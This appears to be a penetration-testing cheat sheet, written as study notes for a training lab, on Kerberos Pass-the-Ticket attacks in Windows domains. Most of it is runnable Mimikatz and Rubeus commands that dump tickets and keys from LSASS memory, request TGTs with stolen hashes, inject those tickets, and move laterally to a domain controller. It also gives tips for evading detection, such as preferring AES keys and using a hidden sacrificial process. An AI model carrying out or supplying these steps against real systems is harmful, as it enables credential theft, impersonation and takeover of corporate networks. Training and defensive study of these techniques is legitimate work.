# Pass the Ticket from Windows
**Concept:** Instead of stealing a password hash, we steal a valid Kerberos Ticket (TGT) from the `LSASS` process memory. We inject this ticket into our current session, allowing us to access network resources as the victim user. 
**Key Difference:**
- **PtH:** Uses NTLM protocol. (Detected by simple NTLM monitoring).
- **PtT:** Uses Kerberos protocol. (Looks like legitimate traffic).
## 1. Harvesting Tickets
**Goal:** Extract valid tickets from memory. 
**Tools:** `Mimikatz` (exports files) or `Rubeus` (exports Base64/files).
### Mimikatz (Export to .kirbi)
**Action:** Dumps all tickets from memory to disk as `.kirbi` files.
```powershell
# Export all tickets
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
```

**Naming Convention:**
- `[id]-username@service-domain.kirbi`
- **User TGT:** Look for `krbtgt` in the service name.
- **Machine Ticket:** Username ends with `$`.
### Rubeus (Dump to Base64)
**Action:** Dumps tickets to stdout (Base64). Better for "fileless" operations or copy-pasting between sessions.
```powershell
# Dump all tickets (Base64)
Rubeus.exe dump /nowrap

# Dump specific service (e.g., krbtgt only)
Rubeus.exe dump /service:krbtgt /nowrap
```
## 2. Overpass the Hash (Pass the Key)
**Concept:** You have the user's NTLM hash or AES Key, but you want to use Kerberos (PtT) instead of NTLM (PtH). You request a fresh TGT from the KDC using the hash/key. 
> [!Warning] OPSEC Warning
> Using NTLM (RC4) keys is often flagged as "Encryption Downgrade." **Always use AES256 keys if available.**
### Step 1: Extract Keys
```powershell
mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit
```
### Step 2: Request TGT (Rubeus - Preferred)
```powershell
# Request TGT using AES256 Key
# /user: User to impersonate
# /aes256: The key extracted above
# /nowrap: Clean output
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc... /nowrap
```
### Step 2: Request TGT (Mimikatz - Alternative)
**Note:** This spawns a new `cmd.exe` window with the ticket already injected.
```powershell
# Syntax: sekurlsa::pth /domain:<Domain> /user:<User> /ntlm:<Hash>
mimikatz.exe "privilege::debug" "sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa..." exit
```
## 3. Pass the Ticket (Execution)
**Goal:** Load the stolen or requested ticket into your current logon session so Windows uses it for authentication.
### Using Rubeus
```powershell
# Option A: Import Base64 Ticket (from Rubeus dump)
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA...

# Option B: Import from .kirbi file (from Mimikatz export)
Rubeus.exe ptt /ticket:ticket.kirbi
```
### Using Mimikatz
```powershell
mimikatz.exe "kerberos::ptt ticket.kirbi" exit
```
## 4. Lateral Movement (PowerShell Remoting)
**Context:** Now that the ticket is in memory, you can connect to remote systems without credentials.
### Method A: Direct Injection (Simple)

Inject the ticket into your _current_ PowerShell process.
1. **Inject:** `Rubeus.exe ptt /ticket:ticket.kirbi`
2. **Connect:**
    ```powershell
    Enter-PSSession -ComputerName DC01
    ls \\DC01\C$
    ```
### Method B: Sacrificial Process (OPSEC Safe)
**Concept:** Injecting tickets into your main process (like `powershell.exe`) can be risky if that process crashes or is inspected. Instead, create a hidden `cmd.exe`, inject the ticket there, and execute your commands from that safe "bubble."

**1. Create Sacrificial Process (Hidden)**
```powershell
# /program defaults to cmd.exe
# /show reveals the window (optional, good for debugging)
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

**2. Request & Inject TGT** Use `asktgt` with the `/ptt` flag inside the context of the new process (or let Rubeus handle the LUID targeting automatically).
```powershell
# Request TGT and Pass-the-Ticket immediately
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<Key> /ptt
```

**3. Connect** Inside the new `cmd.exe` window:
```powershell
powershell
Enter-PSSession -ComputerName DC01
```